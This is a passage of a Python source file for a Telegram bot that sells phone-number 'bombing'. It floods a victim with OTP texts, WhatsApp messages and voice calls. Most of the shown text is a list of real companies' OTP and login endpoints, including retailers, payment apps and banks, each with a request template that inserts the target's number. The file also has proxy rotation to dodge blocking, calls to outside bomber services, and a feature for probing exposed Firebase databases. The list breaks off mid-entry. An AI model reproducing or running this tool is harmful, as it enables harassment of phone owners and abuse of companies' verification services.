#!/usr/bin/env python3
"""
Sʜᴏᴡɴ Lᴇɢᴀᴄʏ
Upgrades:
  - Quote (<blockquote>) on every bot reply + log channel
  - Auto Backup Manager (private GC, admin-controlled interval)
  - Welcome media from Media Manager (random per user)
  - Firebase: Add Only Active + Remove Dead (URL + .txt)
  - Backup import/export (JSON / SQLite)
  - Monitor + Admin Logs panel
  - Premium broadcast (preserves quote + custom emoji via copy_message)
  - API Bomber Library (SMS + WhatsApp + Call) + Mode Selector
  - Parallel Bomb Engine with live per-API progress
  - Extract Active Firebase (probe multi-region RTDB)
"""

import asyncio
import json
import os
import time
import logging
import random
import string
import threading
import io
import re
import sqlite3
from datetime import datetime, date
from copy import deepcopy
from collections import defaultdict
from urllib.parse import quote as urlquote

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ChatMemberUpdated,
    FSInputFile,
    BufferedInputFile
)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

# ── Keep-alive server (Render / Railway / Koyeb need a bound PORT) ──────────
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer as _HTTPServer

class _PingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, *a):  # silence access logs
        pass

def _start_keepalive():
    port = int(os.environ.get("PORT", 8080))
    srv = _HTTPServer(("0.0.0.0", port), _PingHandler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return port
# ────────────────────────────────────────────────────────────────────────────

# ========== FILE LOCK FOR RACE CONDITION PROTECTION ==========
_DB_LOCK = threading.Lock()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("BlastBot")

# ========== PREMIUM EMOJI IDs ==========
EMOJI_FIRE = "5289722755871162900"
EMOJI_STAR = "5372849966689566579"
EMOJI_ROCKET = "5359664288241829619"
EMOJI_CROWN = "6237927637906364256"
EMOJI_SHIELD = "6235476345451716705"
EMOJI_MONEY = "6244678063775289843"
EMOJI_PHONE = "6239930832128056797"
EMOJI_CHECK = "4958689671950369798"
EMOJI_CROSS = "4958900559139570572"
EMOJI_WARNING = "4958526153955476488"
EMOJI_LOCK = "4956719506027185156"
EMOJI_GIFT = "5084613633418199991"
EMOJI_BELL = "5098265504796115765"
EMOJI_GEAR = "5116414868357907335"
EMOJI_VIDEO = "5372849966689566579"
EMOJI_SMS = "6239930832128056797"
EMOJI_WHATSAPP = "6244525973422594836"
EMOJI_CALL = "6235476345451716705"
EMOJI_BOMB = "5289722755871162900"
EMOJI_EXTRACT = "5116414868357907335"
EMOJI_API = "5372849966689566579"

FIRE_EFFECT_ID = "5104841245755180586"

# ========== ULTRA UI EXTRAS ==========
EMOJI_LIGHTNING = "5431815452437257407"
EMOJI_DIAMOND   = "5368324170671202286"
EMOJI_PULSE     = "5431815452437257407"
EMOJI_HOURGLASS = "5424666640367574353"
EMOJI_TARGET    = "5467478377666498277"
EMOJI_BURST     = "5467603095369780240"
EMOJI_ZAPPER    = "5431815452437257407"
EMOJI_SPEED     = "5359664288241829619"
EMOJI_GLOBE     = "5433653135799228968"
EMOJI_CHART_UP  = "5431815452437257407"

# ========== ANIMATED SEPARATORS ==========
SEP_THIN  = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"
SEP_THICK = "━━━━━━━━━━━━━━━━━━"
SEP_WAVE  = "〰〰〰〰〰〰〰〰〰"
SEP_DOT   = "· · · · · · · · · · · · ·"
SEP_STAR  = "✦ ✦ ✦ ✦ ✦ ✦ ✦ ✦ ✦"
SEP_DASH  = "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"

def mini_bar(val: int, total: int, w: int = 10) -> str:
    """Compact progress bar for inline use."""
    if total <= 0: return "░" * w
    f = min(w, int(w * val / total))
    return "▓" * f + "░" * (w - f)

def pct(val: int, total: int) -> str:
    if total <= 0: return "0%"
    return f"{min(100, int(val * 100 / total))}%"

def glow_num(n: int) -> str:
    """Format numbers with visual flair."""
    if n >= 1000:
        return f"{n/1000:.1f}ᴋ"
    return str(n)

def tier_badge(uid: int, d: dict) -> str:
    if is_main_owner(uid): return "👑 ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d):   return "🔱 ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return "🛡 ᴀᴅᴍɪɴ"
    if uid in d.get("approved", []): return "⚡ ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return "🎁 ғʀᴇᴇ"
    return "🔒 ʟᴏᴄᴋᴇᴅ"



SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)

def pf(text: str) -> str:
    """Premium font: first letter UPPERCASE, rest small-caps."""
    if not text:
        return text
    words = text.split(" ")
    out = []
    for w in words:
        if not w:
            out.append(w)
            continue
        first = w[0]
        rest = w[1:]
        if not first.isalpha():
            out.append(w)
            continue
        out.append(first.upper() + sc(rest))
    return " ".join(out)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

def q(text: str) -> str:
    """Wrap any bot reply body in a Telegram quote block."""
    if not text:
        return text
    # avoid double-wrapping
    stripped = text.strip()
    if stripped.startswith("<blockquote>") and stripped.endswith("</blockquote>"):
        return text
    return f"<blockquote>{text}</blockquote>"

def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "", style: str = None) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {pf(text)}".strip() if (fallback_emoji and not emoji_id) else pf(text)
    kwargs = {"text": label, "callback_data": callback_data}
    if emoji_id:
        kwargs["icon_custom_emoji_id"] = emoji_id
    if style in ["primary", "success", "danger"]:
        kwargs["style"] = style
    return InlineKeyboardButton(**kwargs)

def btn_url(text: str, url: str, emoji_id: str = None, fallback_emoji: str = "", style: str = None) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {pf(text)}".strip() if (fallback_emoji and not emoji_id) else pf(text)
    kwargs = {"text": label, "url": url}
    if emoji_id:
        kwargs["icon_custom_emoji_id"] = emoji_id
    if style in ["primary", "success", "danger"]:
        kwargs["style"] = style
    return InlineKeyboardButton(**kwargs)

def style_btn(text: str, style: str = "primary", request_contact: bool = False, request_location: bool = False) -> KeyboardButton:
    # Reply keyboard: keep emoji + plain/pf text; style for Bot API 9.4
    try:
        return KeyboardButton(
            text=text if any(ord(c) > 127 for c in text[:2]) else pf(text),
            style=style if style in ["primary", "success", "danger"] else None,
            request_contact=request_contact,
            request_location=request_location
        )
    except TypeError:
        return KeyboardButton(
            text=text if any(ord(c) > 127 for c in text[:2]) else pf(text),
            request_contact=request_contact,
            request_location=request_location
        )

# Dual UI mode tracking
_UI_MODE: dict = {}  # uid -> "reply"|"inline"
_LAST_INLINE_MSG: dict = {}  # uid -> Message

ALL_REPLY_KEYBOARD_BUTTONS = {
    "💣 Send SMS", "💥 Bomb Mode", "💳 Credits", "🛑 Stop Blast",
    "🎁 Referral", "🔀 Switch to Inline", "📊 Stats",
    "🚀 Start Blast", "📹 Videos", "💰 Credits",
    pf("Send SMS"), pf("Bomb Mode"), pf("Credits"), pf("Stop Blast"),
    pf("Referral"), pf("Switch to Inline"), pf("Stats"),
}

def get_ui_mode(uid: int) -> str:
    return _UI_MODE.get(uid, "reply")

def set_ui_mode(uid: int, mode: str):
    _UI_MODE[uid] = mode

async def _clean_old_inline(bot: Bot, uid: int):
    msg = _LAST_INLINE_MSG.pop(uid, None)
    if msg:
        try:
            await msg.edit_reply_markup(reply_markup=None)
        except Exception:
            pass

async def show_inline(bot: Bot, chat_id: int, uid: int, header: str, inline_kb: InlineKeyboardMarkup):
    set_ui_mode(uid, "inline")
    await _clean_old_inline(bot, uid)
    try:
        await bot.send_message(chat_id, "▫️", reply_markup=ReplyKeyboardRemove())
    except Exception:
        pass
    msg = await bot.send_message(chat_id, q(header), parse_mode="HTML", reply_markup=inline_kb)
    _LAST_INLINE_MSG[uid] = msg
    return msg

async def show_reply(bot: Bot, chat_id: int, uid: int, header: str, reply_kb: ReplyKeyboardMarkup = None):
    set_ui_mode(uid, "reply")
    await _clean_old_inline(bot, uid)
    kb = reply_kb or default_reply_keyboard()
    await bot.send_message(chat_id, q(header), parse_mode="HTML", reply_markup=kb)

def default_reply_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [style_btn("💣 Send SMS", style="success"),    style_btn("💥 Bomb Mode", style="danger")],
            [style_btn("💳 Credits",  style="primary"),    style_btn("🛑 Stop Blast", style="danger")],
            [style_btn("🎁 Referral", style="primary"),    style_btn("📊 Stats",     style="primary")],
            [style_btn("🔀 Switch to Inline", style="primary")],
        ],
        resize_keyboard=True
    )

def switch_row() -> list:
    return [btn("Back to Reply", "switch:reply", EMOJI_GEAR, "🔀")]

MAIN_OWNER = 8695946179
SUPER_ADMIN_NAME = "@ShownOfficial"
SUPER_ADMIN_LINK = "https://t.me/shownofficial"
SUPER_ADMINS = [8695946179]

BOT_TOKEN = ""
LOG_CHANNEL_ID = -1004434276284

_DATA_FILE = "bla1st_data.json"
_VERSION = "v4.0-ULTRA"
_PROGRESS_UPDATE_INTERVAL = 0.4
_SEND_DELAY = 0.0
_BACKGROUND_SCAN_INTERVAL = 60.0

SPEED_FAST = 0.0
SPEED_MEDIUM = 0.02
SPEED_SLOW = 0.08
SPEED_DEFAULT = SPEED_FAST

# Env-configurable limits / proxy
DAILY_BOMB_LIMIT = int(os.getenv("DAILY_BOMB_LIMIT", "500") or "500")
PROXY_LIST = [p.strip() for p in (os.getenv("PROXY_LIST", "") or "").split(",") if p.strip()]
_PROXY_IDX = 0
_PROXY_LOCK = threading.Lock()

DEFAULT_MODE_COSTS = {"sms": 1, "wa": 2, "call": 3, "all": 3}
DEFAULT_UA = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
FAIL_KEYWORDS = ("error", "fail", "invalid", "too many", "blocked", "denied", "unauthorized")
API_DISABLE_AFTER_FAILS = 5
API_DISABLE_DAYS = 7
BOMB_STALL_SECONDS = 300  # 5 min no progress → auto-stop
API_CONSEC_COOLDOWN = 5.0  # same api+number >3 hits → 5s pause

# ---------- Backup Manager defaults ----------
DEFAULT_BACKUP = {
    "enabled": True,
    "chat_id": LOG_CHANNEL_ID,          # private GC / channel for backups
    "interval_minutes": 60,             # owner can change
    "last_backup_ts": 0,
    "keep_last": 20
}

# ---------- RTDB region templates for extract ----------
RTDB_REGIONS = [
    "{p}.firebaseio.com",
    "{p}-default-rtdb.firebaseio.com",
    "{p}-default-rtdb.europe-west1.firebasedatabase.app",
    "{p}-default-rtdb.asia-southeast1.firebasedatabase.app",
]

# ---------- API BOMBER LIBRARY (auto-generated from api.json) ----------
BOMB_APIS = [
    {
        "name": 'Tata Capital Voice Call',
        "type": 'Call',
        "url": 'https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "isOtpViaCallAtLogin": "true"}}',
    },
    {
        "name": '1mg Voice Call',
        "type": 'Call',
        "url": 'https://www.1mg.com/auth_api/v6/create_token',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"number": "{p}", "otp_on_call": true}}',
    },
    {
        "name": 'Swiggy Voice Call',
        "type": 'Call',
        "url": 'https://profile.swiggy.com/api/v3/app/request_call_verification',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Servetel Voice Call',
        "type": 'Call',
        "url": 'https://api.servetel.in/v1/auth/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile_number": "{p}"}}',
    },
    {
        "name": 'Lenskart OTP',
        "type": 'SMS',
        "url": 'https://api-gateway.juno.lenskart.com/v3/customers/sendOtp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phoneCode": "+91", "telephone": "{p}"}}',
    },
    {
        "name": 'Hungama Communication',
        "type": 'SMS',
        "url": 'https://communication.api.hungama.com/v1/communication/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobileNo": "{p}", "countryCode": "+91", "appCode": "un"}}',
    },
    {
        "name": 'Merucab OTP',
        "type": 'SMS',
        "url": 'https://merucabapp.com/api/otp/generate',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile_number": "{p}"}}',
    },
    {
        "name": 'NoBroker OTP',
        "type": 'SMS',
        "url": 'https://www.nobroker.in/api/v3/account/otp/send',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "countryCode": "IN"}}',
    },
    {
        "name": 'Shiprocket OTP',
        "type": 'SMS',
        "url": 'https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobileNumber": "{p}"}}',
    },
    {
        "name": 'Doubtnut Login',
        "type": 'SMS',
        "url": 'https://api.doubtnut.com/v4/student/login',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone_number": "{p}", "language": "en"}}',
    },
    {
        "name": 'Flipkart OTP',
        "type": 'SMS',
        "url": 'https://www.flipkart.com/api/4/user/otp/generate',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobileNumber": "{p}"}}',
    },
    {
        "name": 'Amazon Signin',
        "type": 'SMS',
        "url": 'https://www.amazon.in/ap/signin',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"email": "{p}", "create": "1"}}',
    },
    {
        "name": 'Zepto OTP',
        "type": 'SMS',
        "url": 'https://api.zepto.com/v2/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Blinkit OTP',
        "type": 'SMS',
        "url": 'https://blinkit.com/api/otp/generate',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Myntra OTP',
        "type": 'SMS',
        "url": 'https://www.myntra.com/gw/mobile-auth/otp/generate',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Nykaa OTP',
        "type": 'SMS',
        "url": 'https://www.nykaa.com/api/auth/send-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Zomato Login',
        "type": 'SMS',
        "url": 'https://www.zomato.com/php/asyncLogin.php',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Dominos Order',
        "type": 'SMS',
        "url": 'https://order.godominos.co.in/Online/App.aspx',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"PhoneNo": "{p}"}}',
    },
    {
        "name": 'PhonePe OTP',
        "type": 'SMS',
        "url": 'https://www.phonepe.com/api/v2/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Paytm OTP',
        "type": 'SMS',
        "url": 'https://accounts.paytm.com/signin/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "loginData": "LOGIN_USING_PHONE"}}',
    },
    {
        "name": 'Mobikwik OTP',
        "type": 'SMS',
        "url": 'https://www.mobikwik.com/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Freecharge OTP',
        "type": 'SMS',
        "url": 'https://www.freecharge.in/api/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Jio OTP',
        "type": 'SMS',
        "url": 'https://www.jio.com/api/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Airtel OTP',
        "type": 'SMS',
        "url": 'https://www.airtel.in/thanks-app/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Vodafone Idea OTP',
        "type": 'SMS',
        "url": 'https://www.myvi.in/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Byjus OTP',
        "type": 'SMS',
        "url": 'https://byjus.com/api/otp/send',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Unacademy OTP',
        "type": 'SMS',
        "url": 'https://unacademy.com/api/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Uber OTP',
        "type": 'SMS',
        "url": 'https://auth.uber.com/v2/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Rapido OTP',
        "type": 'SMS',
        "url": 'https://rapido.bike/api/v2/otp/generate',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Pharmeasy OTP',
        "type": 'SMS',
        "url": 'https://pharmeasy.in/api/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Practo Login',
        "type": 'SMS',
        "url": 'https://www.practo.com/patient/loginviapassword',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Apollo OTP',
        "type": 'SMS',
        "url": 'https://www.apollo247.com/api/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'ICICI Bank OTP',
        "type": 'SMS',
        "url": 'https://www.icicibank.com/api/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'HDFC Bank OTP',
        "type": 'SMS',
        "url": 'https://www.hdfcbank.com/api/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Kotak Bank OTP',
        "type": 'SMS',
        "url": 'https://www.kotak.com/api/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'SBI OTP',
        "type": 'SMS',
        "url": 'https://www.sbi.co.in/api/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'FreeFire Bomber',
        "type": 'SMS',
        "url": lambda p: f"https://freefire-api.ct.ws/bomber4.php?phone={p}&duration={{dur}}",
        "method": 'GET',
        "headers": {},
        "data": None,
    },
    {
        "name": 'Bomber Render',
        "type": 'SMS',
        "url": lambda p: f"https://bomberr.onrender.com/num={p}",
        "method": 'GET',
        "headers": {},
        "data": None,
    },
    {
        "name": 'Tata Capital Voice Call',
        "type": 'Call',
        "url": 'https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "isOtpViaCallAtLogin": "true"}}',
    },
    {
        "name": '1MG Voice Call',
        "type": 'Call',
        "url": 'https://www.1mg.com/auth_api/v6/create_token',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"number": "{p}", "otp_on_call": true}}',
    },
    {
        "name": 'Swiggy Call Verification',
        "type": 'Call',
        "url": 'https://profile.swiggy.com/api/v3/app/request_call_verification',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Myntra Voice Call',
        "type": 'Call',
        "url": 'https://www.myntra.com/gw/mobile-auth/voice-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Flipkart Voice Call',
        "type": 'Call',
        "url": 'https://www.flipkart.com/api/6/user/voice-otp/generate',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Amazon Voice Call',
        "type": 'Call',
        "url": 'https://www.amazon.in/ap/signin',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'"phone={p}&action=voice_otp"',
    },
    {
        "name": 'Paytm Voice Call',
        "type": 'Call',
        "url": 'https://accounts.paytm.com/signin/voice-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Zomato Voice Call',
        "type": 'Call',
        "url": 'https://www.zomato.com/php/o2_api_handler.php',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'"phone={p}&type=voice"',
    },
    {
        "name": 'MakeMyTrip Voice Call',
        "type": 'Call',
        "url": 'https://www.makemytrip.com/api/4/voice-otp/generate',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Goibibo Voice Call',
        "type": 'Call',
        "url": 'https://www.goibibo.com/user/voice-otp/generate/',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Ola Voice Call',
        "type": 'Call',
        "url": 'https://api.olacabs.com/v1/voice-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Uber Voice Call',
        "type": 'Call',
        "url": 'https://auth.uber.com/v2/voice-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'KPN WhatsApp',
        "type": 'WhatsApp',
        "url": 'https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6',
        "method": 'POST',
        "headers": {'x-app-id': '66ef3594-1e51-4e15-87c5-05fc8208a20f', 'content-type': 'application/json; charset=UTF-8'},
        "data": lambda p: f'{{"notification_channel": "WHATSAPP", "phone_number": {{"country_code": "+91", "number": "{p}"}}}}',
    },
    {
        "name": 'Lenskart SMS',
        "type": 'SMS',
        "url": 'https://api-gateway.juno.lenskart.com/v3/customers/sendOtp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phoneCode": "+91", "telephone": "{p}"}}',
    },
    {
        "name": 'NoBroker SMS',
        "type": 'SMS',
        "url": 'https://www.nobroker.in/api/v3/account/otp/send',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'"phone={p}&countryCode=IN"',
    },
    {
        "name": 'PharmEasy SMS',
        "type": 'SMS',
        "url": 'https://pharmeasy.in/api/v2/auth/send-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Wakefit SMS',
        "type": 'SMS',
        "url": 'https://api.wakefit.co/api/consumer-sms-otp/',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": "Byju's SMS",
        "type": 'SMS',
        "url": 'https://api.byjus.com/v2/otp/send',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Hungama OTP',
        "type": 'SMS',
        "url": 'https://communication.api.hungama.com/v1/communication/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobileNo": "{p}", "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"}}',
    },
    {
        "name": 'Meru Cab',
        "type": 'SMS',
        "url": 'https://merucabapp.com/api/otp/generate',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'"mobile_number={p}"',
    },
    {
        "name": 'Doubtnut',
        "type": 'SMS',
        "url": 'https://api.doubtnut.com/v4/student/login',
        "method": 'POST',
        "headers": {'content-type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"phone_number": "{p}", "language": "en"}}',
    },
    {
        "name": 'PenPencil',
        "type": 'SMS',
        "url": 'https://api.penpencil.co/v1/users/resend-otp?smsType=1',
        "method": 'POST',
        "headers": {'content-type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{p}"}}',
    },
    {
        "name": 'Snitch',
        "type": 'SMS',
        "url": 'https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile_number": "+91{p}"}}',
    },
    {
        "name": 'Dayco India',
        "type": 'SMS',
        "url": 'https://ekyc.daycoindia.com/api/nscript_functions.php',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'},
        "data": lambda p: f'"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"',
    },
    {
        "name": 'BeepKart',
        "type": 'SMS',
        "url": 'https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "city": 362}}',
    },
    {
        "name": 'Lending Plate',
        "type": 'SMS',
        "url": 'https://lendingplate.com/api.php',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'},
        "data": lambda p: f'"mobiles={p}&resend=Resend"',
    },
    {
        "name": 'ShipRocket',
        "type": 'SMS',
        "url": 'https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobileNumber": "{p}"}}',
    },
    {
        "name": 'GoKwik',
        "type": 'SMS',
        "url": 'https://gkx.gokwik.co/v3/gkstrict/auth/otp/send',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "country": "in"}}',
    },
    {
        "name": 'NewMe',
        "type": 'SMS',
        "url": 'https://prodapi.newme.asia/web/otp/request',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile_number": "{p}", "resend_otp_request": true}}',
    },
    {
        "name": 'Univest',
        "type": 'SMS',
        "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}",
        "method": 'GET',
        "headers": {},
        "data": None,
    },
    {
        "name": 'Smytten',
        "type": 'SMS',
        "url": 'https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "email": "test@example.com"}}',
    },
    {
        "name": 'CaratLane',
        "type": 'SMS',
        "url": 'https://www.caratlane.com/cg/dhevudu',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"query": "mutation {{SendOtp(input: {{mobile: \"{p}\",isdCode: \"91\",otpType: \"registerOtp\"}}) {{status {{message code}}}}}}"}}',
    },
    {
        "name": 'BikeFixup',
        "type": 'SMS',
        "url": 'https://api.bikefixup.com/api/v2/send-registration-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json; charset=UTF-8'},
        "data": lambda p: f'{{"phone": "{p}", "app_signature": "4pFtQJwcz6y"}}',
    },
    {
        "name": 'WellAcademy',
        "type": 'SMS',
        "url": 'https://wellacademy.in/store/api/numberLoginV2',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json; charset=UTF-8'},
        "data": lambda p: f'{{"contact_no": "{p}"}}',
    },
    {
